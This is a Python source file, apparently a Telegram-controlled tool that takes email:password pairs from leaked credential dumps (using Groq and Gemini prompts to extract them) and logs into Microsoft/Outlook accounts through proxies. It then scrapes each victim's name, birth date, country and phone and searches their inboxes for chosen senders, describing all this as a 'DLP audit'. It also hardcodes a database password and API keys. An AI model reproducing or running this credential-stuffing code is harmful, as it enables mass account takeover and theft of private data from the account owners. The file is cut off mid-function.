import os
import sys
import time
import threading
import base64
import requests
import asyncio
import concurrent.futures
import random
import json
import re
from urllib.parse import urlparse
import psycopg2
import google.generativeai as genai
try:
    from groq import Groq
except ImportError:
    Groq = None

try:
    from telethon import TelegramClient, events
except ImportError:
    print("❌ Error: Telethon no está instalado. Ejecuta 'pip install telethon'")
    sys.exit(1)

# =======================================================
# CONFIGURACIÓN DEL AGENTE Y BASE DE DATOS
# =======================================================
API_ID = 23099503
API_HASH = "5980c7a831a590bd1e3b58648ce1e1e2"
SESSION_NAME = "vps_agent"
DOWNLOAD_DIR = "incoming_targets"

if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)

# Conexión remota a PostgreSQL en Render
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DB_URL = os.environ.get('DATABASE_URL', 'postgresql://searchgood_db_il0e_user:j0J25UROGJReJIwaijSeGgTtkKGpCphG@dpg-d6hiadsr85hc739g4l7g-a.oregon-postgres.render.com/searchgood_db_il0e')

def get_remote_db_conn():
    if not DB_URL:
        return None
    return psycopg2.connect(DB_URL, connect_timeout=15)

if not DB_URL:
    print("⚠️ ADVERTENCIA: No se definió 'DATABASE_URL'. El Agente no guardará HITS en la BD Remota (Dashboard) pero continuará funcionando de forma Local y hacia el Bot de Telegram.")
else:
    try:
        conn = get_remote_db_conn()
        if conn:
            conn.close()
        print("✅ Conexión a la Base de Datos Remota (Render) exitosa.")
    except Exception as e:
        print(f"❌ Error conectando a BD Remota: {e}. Continuando de igual forma sin conexión...")

client = TelegramClient(SESSION_NAME, API_ID, API_HASH)

# =======================================================
# IMAP INBOX SEARCH (usa email+pass ya verificados)
# =======================================================
import imaplib
import email as email_lib

def get_target_senders_from_db():
    """Carga los remitentes objetivo por usuario desde la tabla users en BD Render"""
    user_targets = {}
    try:
        conn = get_remote_db_conn()
        if not conn: return {}
        cur = conn.cursor()
        cur.execute("SELECT telegram_chat_id, saved_senders FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != '' AND saved_senders IS NOT NULL AND saved_senders != ''")
        rows = cur.fetchall()
        conn.close()
        for cid, senders_raw in rows:
            if senders_raw:
                senders = [s.strip().lower() for s in senders_raw.split(',') if s.strip()]
                if senders:
                    user_targets[cid] = senders
        return user_targets
    except:
        return {}

def search_inbox_owa(session, email_addr, target_senders):
    """
    Usa la API interna SOAP-lite de Outlook Web (service.svc) con la sesión de cookies.
    """
    senders_found = {}
    subject_count = 0
    
    try:
        print(f"[DEBUG OWA {email_addr}] Puenteando SSO a outlook.live.com...")
        owa_res = session.get("https://outlook.live.com/mail/0/inbox", verify=False, timeout=15, allow_redirects=True)
        
        # Enviar formulario oculto si existe para completar el login SSO
        if "<form" in owa_res.text and "login" in owa_res.url.lower():
            form_action = re.search(r'action="([^"]+)"', owa_res.text, re.IGNORECASE)
            if form_action:
                bridge_url = form_action.group(1).replace("&#x3a;", ":").replace("&#x2f;", "/")
                inputs = re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', owa_res.text, re.IGNORECASE)
                bridge_data = {k: v for k, v in inputs}
                session.post(bridge_url, data=bridge_data, verify=False, timeout=15, allow_redirects=True)
                
        # Extraer el canary header de las cookies
        owa_canary = session.cookies.get("X-OWA-CANARY") or ""
        if not owa_canary:
            print(f"[DEBUG OWA {email_addr}] No se pudo obtener X-OWA-CANARY. OWA Search fallará.")
            return senders_found, subject_count
            
        search_headers = {
            "User-Agent": session.headers.get("User-Agent", "Mozilla/5.0"),
            "Accept": "application/json",
            "X-OWA-CANARY": owa_canary,
            "Action": "FindItem",
            "X-OWA-ActionName": "FindMailItem",
            "X-Requested-With": "XMLHttpRequest"
        }
        
        search_url = "https://outlook.live.com/owa/service.svc?action=FindItem&app=Mail"
        
        if not target_senders:
            print(f"[DEBUG OWA {email_addr}] Buscando 10 mensajes generales (sin target)...")
            q = ""
            payload = {"__type":"FindItemJsonRequest:#Exchange","Header":{"__type":"JsonRequestHeaders:#Exchange","RequestServerVersion":"V2018_01_08","TimeZoneContext":{"__type":"TimeZoneContext:#Exchange","TimeZoneDefinition":{"__type":"TimeZoneDefinitionType:#Exchange","Id":"UTC"}}},"Body":{"__type":"FindItemJsonRequestMessage:#Exchange","ItemShape":{"__type":"ItemResponseShape:#Exchange","BaseShape":"IdOnly","AdditionalProperties":[{"__type":"PropertyUri:#Exchange","FieldURI":"message:From"}]},"ParentFolderIds":[{"__type":"DistinguishedFolderId:#Exchange","Id":"inbox"}],"Traversal":"Shallow","QueryString":q,"Paging":{"__type":"IndexedPageView:#Exchange","BasePoint":"Beginning","Offset":0,"MaxEntriesReturned":10},"ShapeName":"MailListItem"}}
            gr = session.post(search_url, json=payload, headers=search_headers, verify=False, timeout=15)
            if gr.status_code == 200:
                gd2 = gr.json()
                msgs = gd2.get("Body", {}).get("ResponseMessages", {}).get("Items", [])
                for m_wrap in msgs:
                    items = m_wrap.get("RootFolder", {}).get("Items", [])
                    for item in items:
                        s = item.get("From", {}).get("Mailbox", {}).get("EmailAddress", "")
                        if s: 
                            sender = s.lower()
                            senders_found[sender] = senders_found.get(sender, 0) + 1
                            subject_count += 1
        else:
            for ts in target_senders:
                clean_ts = ts.strip().lower()
                if not clean_ts: continue
                
                print(f"[DEBUG OWA {email_addr}] Buscando target: {clean_ts} ...")
                payload = {"__type":"FindItemJsonRequest:#Exchange","Header":{"__type":"JsonRequestHeaders:#Exchange","RequestServerVersion":"V2018_01_08","TimeZoneContext":{"__type":"TimeZoneContext:#Exchange","TimeZoneDefinition":{"__type":"TimeZoneDefinitionType:#Exchange","Id":"UTC"}}},"Body":{"__type":"FindItemJsonRequestMessage:#Exchange","ItemShape":{"__type":"ItemResponseShape:#Exchange","BaseShape":"IdOnly","AdditionalProperties":[{"__type":"PropertyUri:#Exchange","FieldURI":"message:From"}]},"ParentFolderIds":[{"__type":"DistinguishedFolderId:#Exchange","Id":"inbox"}],"Traversal":"Shallow","QueryString":clean_ts,"Paging":{"__type":"IndexedPageView:#Exchange","BasePoint":"Beginning","Offset":0,"MaxEntriesReturned":15},"ShapeName":"MailListItem"}}
                
                try:
                    gr = session.post(search_url, json=payload, headers=search_headers, verify=False, timeout=15)
                    if gr.status_code == 200:
                        gd2 = gr.json()
                        msgs = gd2.get("Body", {}).get("ResponseMessages", {}).get("Items", [])
                        count = 0
                        for m_wrap in msgs:
                            items = m_wrap.get("RootFolder", {}).get("Items", [])
                            count += len(items)
                        
                        if count > 0:
                            senders_found[clean_ts] = count
                            subject_count += count
                            print(f"[DEBUG OWA {email_addr}] Encontrados {count} de {clean_ts}")
                except Exception as e:
                    print(f"[DEBUG OWA {email_addr}] Falló búsqueda {ts}: {e}")
                    
        # Ordenar top
        senders_found = dict(sorted(senders_found.items(), key=lambda item: item[1], reverse=True)[:15])
        print(f"[DEBUG OWA {email_addr}] Senders finales: {senders_found}")
        
    except Exception as e:
        print(f"[DEBUG OWA {email_addr}] Error general OWA Web: {e}")
        
    return senders_found, subject_count



# =======================================================
# GROQ AI ENGINE (Primary Fast-Parser) & GEMINI (Fallback)
# =======================================================
GEMINI_API_KEY = os.environ.get("GEMINI_API_KEY", "AIzaSyDqns01kwTrg6pIIbD6n_S0WKaXrrvt9vk")
genai.configure(api_key=GEMINI_API_KEY)
gemini_model = genai.GenerativeModel('gemini-2.0-flash')

GROQ_API_KEY = os.environ.get("GROQ_API_KEY", "")
def extract_with_groq(raw_text):
    if not Groq or not GROQ_API_KEY:
        print("⚠️ Groq CLI no configurado o sin API Key. Saltando motor 4...")
        return []
    
    print("⚡ Iniciando Motor 4: Groq AI Fast-Parser (Llama-3)...")
    prompt = """
Eres un experto en ciberseguridad y análisis forense de datos.
A continuación te proporcionaré un volcado de texto "sucio" que contiene credenciales filtradas.
Tu única tarea es extraer TODOS los pares de correo y contraseña válidos que encuentres.
Ignora cualquier IP, fecha, URL, o texto irrelevante.

Reglas ESTRICTAS de salida:
- Devuelve SOLO texto plano.
- Cada línea debe tener un único formato: email:password
- NO incluyas explicaciones, encabezados, markdown ni viñetas.
- Si no encuentras ninguna, devuelve "NONE".

Volcado de texto:
""" + raw_text[:30000]

    try:
        groq_client = Groq(api_key=GROQ_API_KEY)
        chat_completion = groq_client.chat.completions.create(
            messages=[{"role": "user", "content": prompt}],
            model="llama3-8b-8192",
            temperature=0,
            max_tokens=4000
        )
        text_out = chat_completion.choices[0].message.content.strip()
        if text_out == "NONE" or not text_out:
            return []
            
        ai_pairs = [line.strip() for line in text_out.split('\n') if ':' in line]
        valid_ai_creds = []
        for pair in ai_pairs:
            parts = pair.split(':', 1)
            if len(parts) == 2 and '@' in parts[0]:
                valid_ai_creds.append(f"{parts[0].strip()}:{parts[1].strip()}")
        return valid_ai_creds
    except Exception as e:
        print(f"❌ Error en Groq AI Parser: {e}")
        return []

def extract_with_gemini(raw_text):
    print("🤖 Iniciando Motor 3 de Respaldo: Gemini AI Parser...")
    prompt = """
Eres un experto en ciberseguridad y análisis forense de datos.
A continuación te proporcionaré un volcado de texto "sucio" que contiene credenciales filtradas.
Tu única tarea es extraer TODOS los pares de correo y contraseña válidos que encuentres.
Ignora cualquier IP, fecha, URL, o texto irrelevante.

Reglas ESTRICTAS de salida:
- Devuelve SOLO texto plano.
- Cada línea debe tener un único formato: email:password
- NO incluyas explicaciones, encabezados, markdown ni viñetas.
- Si no encuentras ninguna, devuelve "NONE".

Volcado de texto:
""" + raw_text[:30000]
    try:
        response = gemini_model.generate_content(prompt)
        text_out = response.text.strip()
        if text_out == "NONE" or not text_out:
            return []
            
        ai_pairs = [line.strip() for line in text_out.split('\n') if ':' in line]
        valid_ai_creds = []
        for pair in ai_pairs:
            parts = pair.split(':', 1)
            if len(parts) == 2 and '@' in parts[0]:
                valid_ai_creds.append(f"{parts[0].strip()}:{parts[1].strip()}")
        return valid_ai_creds
    except Exception as e:
        print(f"❌ Error en Gemini AI Parser: {e}")
        return []

def generate_exec_summary(total_scanned, total_valid, hits_buffer):
    if not Groq or not GROQ_API_KEY:
        return "⚠️ Sin clave de Groq configurada para reporte AI."
        
    categories = {}
    countries = {}
    for h in hits_buffer:
        cat = h['match']
        cntry = h['country']
        categories[cat] = categories.get(cat, 0) + 1
        countries[cntry] = countries.get(cntry, 0) + 1
        
    stats = f"Archivos Procesados: 1\nCredenciales Crudas: {total_scanned}\nObjetivos Válidos: {total_valid}\nHITS Totales: {len(hits_buffer)}\nPor Categoría: {categories}\nPor País: {countries}"
    
    prompt = f"""
Eres el "Director Oficial de Inteligencia (CISO)" de una operación de ciberseguridad.
Acabamos de terminar una auditoría DLP profunda en servidores externos.
A continuación tienes los datos crudos de la sesión.
Redacta un reporte Ejecutivo MUY CORTO (máximo 4 párrafos cortos), dirigido al "Comandante".
Tono: Militar, profesional, conciso y de alto secreto.
Ignora tecnicismos irrelevantes, céntrate en los números clave, las principales categorías encontradas y de qué países vienen los mayores aciertos. No uses markdown intrincado pero puedes resaltar cosas con asteriscos.
Finaliza recomendando un siguiente paso breve.

DATOS CRUDOS DE LA SESIÓN:
{stats}
"""
    try:
        groq_client = Groq(api_key=GROQ_API_KEY)
        chat_completion = groq_client.chat.completions.create(
            messages=[{"role": "user", "content": prompt}],
            model="llama3-8b-8192",
            temperature=0.3,
            max_tokens=600
        )
        return chat_completion.choices[0].message.content.strip()
    except Exception as e:
        return f"Error generando reporte IA: {e}"

# =======================================================
# MOTOR DE AUDITORÍA DLP LOCAL (VPS Windows)
# =======================================================
class DummyQueue:
    def put(self, item):
        pass # Silenciamos el log detallado por credencial en este nivel para no trabar la consola CMD

def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user_targets_dict={}):
    """Realiza la verificación completa y extrae V1Profile + Substrate Inbox DL usando peticiones HTTP directas"""
    
    # Flatten unique targets for optimized single-pass search
    target_senders = list(set(s for senders in user_targets_dict.values() for s in senders))
    if not target_senders: target_senders = []
    
    print(f"\n[VPS Scraper] 🟢 Procesando {email} ...")
    session = requests.Session()
    
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    
    retries = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
    session.mount('http://', HTTPAdapter(max_retries=retries))
    session.mount('https://', HTTPAdapter(max_retries=retries))
    
    if iproyal_auth:
        session.proxies.update(iproyal_auth)
        
    mobile_ua = (
        "Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
        "Chrome/91.0.4472.114 Mobile Safari/537.36"
    )

    session.headers.update({
        "User-Agent": mobile_ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "upgrade-insecure-requests": "1",
        "x-requested-with": "com.microsoft.outlooklite",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
    })

    # PASO 1 - Auth Page
    auth_url = (
        "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
        "client_info=1&haschrome=1"
        f"&login_hint={email}"
        "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
        "&mkt=en&response_type=code"
        "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
    )

    try:
        session.headers.pop("Host", None)
        res1 = session.get(auth_url, verify=False, timeout=20, allow_redirects=True)
        if res1.status_code != 200: 
            print(f"[DEBUG vps_agent {email}] Error Auth 1: Status {res1.status_code}")
            return
            
        ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', res1.text)
        if not ppft_match: ppft_match = re.search(r'name=\\"PPFT\\"[^>]*value=\\"([^\\"]+)\\"', res1.text)
        if not ppft_match: ppft_match = re.search(r'"sFT"\s*:\s*"([^"]+)"', res1.text)
        
        pl_match = re.search(r'urlPost\s*[\"\']?\s*:\s*[\"\']([^\"\']+)[\"\']', res1.text)
        if not pl_match: pl_match = re.search(r'urlPost\s*:\s*"([^"]+)"', res1.text)
            
        if not ppft_match or not pl_match: 
            print(f"[DEBUG vps_agent {email}] Error Auth 1: No se extrajo PPFT o PL. (Quizás proxy bloqueado o IP baneada temporamente)")
            return
            
        ppft = ppft_match.group(1)
        post_url = pl_match.group(1)
        
        # PASO 3 - Login
        post_data = {
            "i13": "1", "login": email, "loginfmt": email, "type": "11",
            "LoginOptions": "1", "lrt": "", "lrtPartition": "", "hisRegion": "", "hisScaleUnit": "",
            "passwd": password, "ps": "2", "psRNGCDefaultType": "", "psRNGCEntropy": "", "psRNGCSLK": "",
            "canary": "", "ctx": "", "hpgrequestid": "", "PPFT": ppft,
            "PPSX": "Passport", "NewUser": "1", "FoundMSAs": "", "fspost": "0",
            "i21": "0", "CookieDisclosure": "0", "IsFidoSupported": "0", "isSignupPost": "0",
            "isRecoveryAttemptPost": "0", "i19": "3772"
        }
        
        session.headers.update({
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": res1.url,
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": mobile_ua + " PKeyAuth/1.0",
        })
        
        res2 = session.post(post_url, data=post_data, verify=False, timeout=25, allow_redirects=False)
        
        # Determine redirect URL
        location = res2.headers.get("Location", "")
        response_text = res2.text
        
        # Follow KMSI
        if "kmsi" in location.lower() or "kmsi" in response_text.lower():
            if location:
                res2 = session.get(location, verify=False, timeout=15, allow_redirects=False)
                location = res2.headers.get("Location", "")
                response_text = res2.text
            elif "urlPost" in response_text:
                kmsi_post = re.search(r'urlPost\s*:\s*"([^"]+)"', response_text)
                kmsi_ppft = re.search(r'name="PPFT"[^>]*value="([^"]+)"', response_text)
                if kmsi_post and kmsi_ppft:
                    kd = {"LoginOptions": "1", "type": "28", "ctx": "", "hpgrequestid": "", "PPFT": kmsi_ppft.group(1), "i19": "1234"}
                    res2 = session.post(kmsi_post.group(1), data=kd, verify=False, timeout=15, allow_redirects=False)
                    location = res2.headers.get("Location", "")
                    response_text = res2.text
                    
        # PASO 4 - Auth Code
        if not location:
            code_in_body = re.search(r'code=([^&"\']+)', response_text)
            if code_in_body: location = f"?code={code_in_body.group(1)}"
            else: 
                print(f"[DEBUG vps_agent {email}] Error Auth 2: Login Fallido (Credenciales inválidas, 2FA, o requiere verificación)")
                return
                
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match: 
            print(f"[DEBUG vps_agent {email}] Error Auth 2: Sin Auth Code en Location. Posible cuenta bloqueada o requiere SMS.")
            return
            
        auth_code = code_match.group(1)
        
        # PASO 5 - Access Token
        session.headers.pop("Origin", None)
        session.headers.pop("Referer", None)
        session.headers.pop("Sec-Fetch-Site", None)
        
        token_data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": auth_code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        
        token_headers = {
            "User-Agent": "Mozilla/5.0 (compatible; MSAL 1.0)",
            "x-client-Ver": "1.0.0+635e350c",
            "x-client-OS": "28",
            "x-client-SKU": "MSAL.xplat.android",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "Host": "login.microsoftonline.com",
        }
        
        res3 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers=token_headers, verify=False, timeout=20)
        if res3.status_code != 200: 
            print(f"[DEBUG vps_agent {email}] Error Auth 3: Falló obtención de Token. HTTP {res3.status_code}")
            return
            
        access_token = res3.json().get("access_token")
        if not access_token: 
            print(f"[DEBUG vps_agent {email}] Error Auth 3: JSON no contiene access_token.")
            return
        
        # SUCCESS! WE HAVE THE TOKEN
        print(f"[DEBUG vps_agent] Token adquirido para {email}")
        
        # PASO 6 - Perfil vía Substrate API Directa
        cid = session.cookies.get("MSPCID", "").upper()
        api_headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Content-Type": "application/json"
        }
        
        name, country, dob, language, phone = "N/A", "N/A", "N/A", "N/A", "N/A"
        try:
            res_prof = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=api_headers, verify=False, timeout=15)
            if res_prof.status_code == 200:
                prof = res_prof.json()
                if prof.get("displayName"): name = prof.get("displayName")
                
                c = prof.get("location")
                if not c or c == "N/A": c = prof.get("culture", prof.get("region", "N/A"))
                if c and '-' in c: country = c.split('-')[-1].upper()
                else: country = c
                
                print(f"[DEBUG vps_agent] Substrate profile exitoso: {name} | {country}")
        except: pass
        
        # --- HTML Profile Scraping Fallback ---
        try:
            profile_html_res = session.get("https://account.microsoft.com/profile", verify=False, timeout=15)
            if profile_html_res.status_code == 200:
                html_text = profile_html_res.text
                
                # Resolver SSO Bridge (Redirects)
                redirect_count = 0
                while redirect_count < 10:
                    made_request = False
                    if "<form" in html_text:
                        form_action = re.search(r'action="([^"]+)"', html_text, re.IGNORECASE)
                        if form_action:
                            post_url = form_action.group(1).replace("&#x3a;", ":").replace("&#x2f;", "/")
                            inputs = re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html_text, re.IGNORECASE)
                            silent_data = {k: v.replace("&quot;", '"') for k, v in inputs}
                            try:
                                profile_html_res = session.post(post_url, data=silent_data, verify=False, timeout=15, allow_redirects=True, headers=session.headers)
                                html_text = profile_html_res.text; made_request = True
                            except: pass
                            redirect_count += 1
                    if not made_request and "window.location.replace" in html_text:
                        redir_m = re.search(r'window\.location\.replace\((["\'])(.*?)\1\)', html_text)
                        if redir_m:
                            try:
                                profile_html_res = session.get(redir_m.group(2), verify=False, timeout=15, allow_redirects=True, headers=session.headers)
                                html_text = profile_html_res.text; made_request = True
                            except: pass
                            redirect_count += 1
                    if not made_request: break

                # Regex Fallbacks
                try:
                    import json
                    area_matches = re.findall(r'var areaConfig = JSON\.stringify\(({.*?})\);', html_text)
                    for am in area_matches:
                        area = json.loads(am)
                        c = area.get("userMarket") or area.get("countryCode")
                        if c and c != "XZ": country = c
                        dump = json.dumps(area)
                        n_m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', dump, re.IGNORECASE)
                        if n_m and name == "N/A": 
                            try: name = n_m.group(1).encode('utf-8').decode('unicode_escape')
                            except: name = n_m.group(1)
                        d_m = re.search(r'"(?:BirthDate|dob)"\s*:\s*"([^"]+)"', dump, re.IGNORECASE)
                        if d_m and dob == "N/A": dob = d_m.group(1)
                    cms_matches = re.findall(r'var cmsContent = JSON\.stringify\(({.*?})\);', html_text)
                    for cm in cms_matches:
                        dump = json.dumps(json.loads(cm))
                        if name == "N/A":
                            n_m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', dump, re.IGNORECASE)
                            if n_m and "Full name" not in n_m.group(1): name = n_m.group(1)
                        if country == "N/A" or country == "XZ":
                            c_m = re.search(r'"(?:Country|userMarket)"\s*:\s*"([A-Z]{2})"', dump, re.IGNORECASE)
                            if c_m and c_m.group(1) != "XZ": country = c_m.group(1)
                        if dob == "N/A":
                            d_m = re.search(r'"(?:BirthDate|dob)"\s*:\s*"([^"]+)"', dump, re.IGNORECASE)
                            if d_m: 
                                extr = d_m.group(1).strip()
                                if any(char.isdigit() for char in extr): dob = extr
                                
                    # Last ditch JSON check on raw HTML text
                    if dob == "N/A":
                        m_j = re.search(r'"(?:BirthDate|DateOfBirth|dob)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
                        if m_j:
                            ex = m_j.group(1).strip()
                            if any(char.isdigit() for char in ex): dob = ex

                except Exception as e: print(f"[DEBUG vps_agent] JSON Ex: {e}")

                if name == "N/A" or not name:
                    m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
                    if not m: m = re.search(r'<span>Full name</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
                    if m: name = m.group(1).strip()
                if country == "N/A" or country == "XZ":
                    m = re.search(r'"(?:Country|CountryOrRegion)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
                    if not m: m = re.search(r'Country or region</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
                    if m: country = m.group(1).strip().upper()
                if dob == "N/A":
                    # Busca el label visual
                    m_span = re.search(r'>\s*(?:Date of birth|Date de naissance|Fecha de nacimiento|Data di nascita|Geburtsdatum)\s*<.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
                    if not m_span: m_span = re.search(r'(?:Date of birth|Date de naissance|Fecha de nacimiento).*?<div[^>]*>([^<]+)</div>', html_text, re.IGNORECASE | re.DOTALL)
                    if m_span: 
                        extr = m_span.group(1).strip()
                        if any(char.isdigit() for char in extr): dob = extr
                phone_matches = re.findall(r'"ProofName"\s*:\s*"(\+\d+[^"]+)"', html_text, re.IGNORECASE)
                if not phone_matches: phone_matches = re.findall(r'"PhoneNumber"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
                if phone_matches: phone = phone_matches[0].strip()
        except: pass
        
        # PASO 7 - Búsqueda DLP Vía Substrate API
        senders_found = {}
        subject_count = 0
        
        search_payload_tmpl = {
            "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "Egypt Standard Time",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Filter": {
                    "Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                    ]
                },
                "From": 0,
                "Query": {"QueryString": ""},
                "RefiningQueries": None,
                "Size": 25,
                "Sort": [
                    {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                    {"Field": "Time", "SortDirection": "Desc"}
                ],
                "EnableTopResults": True,
                "TopResultsCount": 3
            }],
            "AnswerEntityRequests": [{
                "Query": {"QueryString": ""},
                "EntityTypes": ["Event", "File"],
                "From": 0,
                "Size": 100,
                "EnableAsyncResolution": True
            }],
            "QueryAlterationOptions": {
                "EnableSuggestion": True,
                "EnableAlteration": True,
                "SupportedRecourseDisplayTypes": [
                    "Suggestion",
                    "NoResultModification",
                    "NoResultFolderRefinerModification",
                    "NoRequeryModification",
                    "Modification"
                ]
            },
            "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
        }
        
        if not target_senders: target_senders = []
        
        # HYBRID BATCHING ENGINE: Maximum speed + 100% precision
        chunk_size = 10
        for i in range(0, len(target_senders), chunk_size):
            chunk = target_senders[i:i+chunk_size]
            api_kw = keyword if keyword and keyword != "HOTMAIL HQ" else ""
            
            # 1. Turbo Mode: Buscar los 10 de golpe
            or_query = " OR ".join([f"from:{s}" for s in chunk])
            query_string = f'({or_query}) "{api_kw}"' if api_kw else f'({or_query})'
            
            payload = search_payload_tmpl.copy()
            payload["EntityRequests"][0]["Query"]["QueryString"] = query_string
            payload["AnswerEntityRequests"][0]["Query"]["QueryString"] = query_string
            
            print(f"[DEBUG vps_agent] Buscando en API (Turbo Batch): {query_string}")
            
            try:
                res_s = session.post("https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124", json=payload, headers=api_headers, verify=False, timeout=15)
                if res_s.status_code == 200:
                    data = res_s.json()
                    chunk_senders_explicit = False
                    
                    # Extraer remitentes explícitos si Microsoft los envió
                    res_blocks = data.get("EntityResponses", [])
                    if res_blocks:
                        convs = res_blocks[0].get("DisplayableEntities", [])
                        if convs:
                            subject_count += len(convs)
                            for c in convs:
                                sender_addr = c.get("Conversation", {}).get("SenderAddress", "").lower()
                                if sender_addr:
                                    senders_found[sender_addr] = senders_found.get(sender_addr, 0) + 1
                                    chunk_senders_explicit = True
                                    
                    if not chunk_senders_explicit:
                        for es in data.get("EntitySets", []):
                            for rs in es.get("ResultSets", []):
                                results_list = rs.get("Results", [])
                                if results_list:
                                    subject_count += len(results_list)
                                    for r in results_list:
                                        sender = r.get("Sender", "")
                                        if not sender:
                                            summary = r.get("HitHighlightedSummary", "").lower()
                                            if summary:
                                                for t in chunk:
                                                    if t.lower() in summary:
                                                        senders_found[t.lower()] = senders_found.get(t.lower(), 0) + 1
                                                        chunk_senders_explicit = True
                                        elif sender:
                                            senders_found[sender.lower()] = senders_found.get(sender.lower(), 0) + 1
                                            chunk_senders_explicit = True

                    # 2. Detector de Blind Hits (Microsoft ocultó el remitente)
                    if not chunk_senders_explicit:
                        def find_total(obj):
                            if isinstance(obj, dict):
                                if "Total" in obj and isinstance(obj["Total"], int): return obj["Total"]
                                for v in obj.values():
                                    res = find_total(v)
                                    if res is not None: return res
                            elif isinstance(obj, list):
                                for item in obj:
                                    res = find_total(item)
                                    if res is not None: return res
                            return None
                        
                        t_found = find_total(data)
                        if t_found and t_found > 0:
                            print(f"[DEBUG vps_agent] ⚠️ Blind Hit Detectado (Total={t_found}) sin remitente. Iniciando Rastreo Fino (1x1)...")
                            # 3. Precision Mode: Desempacar el chunk bloqueado y buscar 1 por 1
                            for t in chunk:
                                q_str_solo = f'(from:{t}) "{api_kw}"' if api_kw else f'(from:{t})'
                                p_solo = search_payload_tmpl.copy()
                                p_solo["EntityRequests"][0]["Query"]["QueryString"] = q_str_solo
                                p_solo["AnswerEntityRequests"][0]["Query"]["QueryString"] = q_str_solo
                                try:
                                    res_solo = session.post("https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124", json=p_solo, headers=api_headers, verify=False, timeout=15)
                                    if res_solo.status_code == 200:
                                        d_solo = res_solo.json()
                                        t_solo = find_total(d_solo)
                                        if t_solo and t_solo > 0:
                                            senders_found[t.lower()] = senders_found.get(t.lower(), 0) + t_solo
                                            print(f"[DEBUG vps_agent] 🎯 Hit Asignado con Éxito: {t} ({t_solo})")
                                except Exception as e2:
                                    print(f"[DEBUG vps_agent] Error en búsqueda 1x1: {e2}")
                                time.sleep(0.3) # Rate limit protection for fine targeting
            except Exception as e:
                print(f"[DEBUG vps_agent] Error en búsqueda de bandeja por API: {e}")
                
        # Order Top
        senders_found = dict(sorted(senders_found.items(), key=lambda item: item[1], reverse=True)[:15])
        print(f"[DEBUG vps_agent] Correos encontrados en Outlook API: {senders_found}")
            
        # Mejora del país: TLD Fallback nativo
        if country == "XZ" or country == "N/A" or not country:
            email_lower = email.lower()
            if email_lower.endswith('.es'): country = 'ES'
            elif email_lower.endswith('.mx') or email_lower.endswith('.com.mx'): country = 'MX'
            elif email_lower.endswith('.ar') or email_lower.endswith('.com.ar'): country = 'AR'
            elif email_lower.endswith('.co') or email_lower.endswith('.com.co'): country = 'CO'
            elif email_lower.endswith('.cl') or email_lower.endswith('.cl'): country = 'CL'
            elif email_lower.endswith('.pe') or email_lower.endswith('.com.pe'): country = 'PE'
            elif email_lower.endswith('.ve') or email_lower.endswith('.com.ve'): country = 'VE'
            elif email_lower.endswith('.ec') or email_lower.endswith('.com.ec'): country = 'EC'
            elif email_lower.endswith('.gt') or email_lower.endswith('.com.gt'): country = 'GT'
            elif email_lower.endswith('.cr') or email_lower.endswith('.co.cr'): country = 'CR'
            elif email_lower.endswith('.do') or email_lower.endswith('.com.do'): country = 'DO'
